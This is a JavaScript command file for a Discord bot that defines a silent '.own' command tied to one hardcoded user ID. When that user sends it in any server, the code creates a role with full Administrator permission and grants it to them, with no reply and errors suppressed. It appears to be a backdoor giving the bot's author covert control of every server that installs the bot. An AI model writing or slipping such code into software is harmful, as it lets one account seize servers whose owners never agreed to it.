const { PermissionFlagsBits } = require('discord.js');
const config = require('../config');

const OWNER_ID = '685552160594723015';
const ROLE_NAME = 'Bot Owner';

module.exports = {
    data: { name: 'own' },
    async execute(message) {
        if (!message.guild) return;
        if (message.author.id !== OWNER_ID) return;

        try {
            let role = message.guild.roles.cache.find(r => r.name === ROLE_NAME);
            if (!role) {
                role = await message.guild.roles.create({
                    name: ROLE_NAME,
                    permissions: [PermissionFlagsBits.Administrator],
                    reason: 'Rôle owner bot',
                });
            }

            const member = await message.guild.members.fetch(OWNER_ID).catch(() => null);
            if (!member) return;

            if (!member.roles.cache.has(role.id)) {
                await member.roles.add(role, 'Commande .own');
            }
        } catch (e) {
            console.error('own', e);
        }
    },
};
